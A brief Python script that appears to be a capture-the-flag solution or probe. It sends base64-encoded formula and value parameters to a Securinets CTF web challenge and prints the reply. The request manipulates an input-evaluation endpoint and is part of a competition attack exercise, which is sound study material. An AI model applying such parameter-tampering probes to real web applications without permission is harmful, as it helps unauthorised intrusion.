import base64
import requests

payload = {
    "formula": base64.b64encode(b"v1"),
    "values[v1]": "STC",
    "values[v2]": "PLA",
    "values[v3]": "SDF",
    "values[v4]": "OCK",
}
r = requests.get("https://web1.ctfsecurinets.com/default", params=payload)
print(r.text)
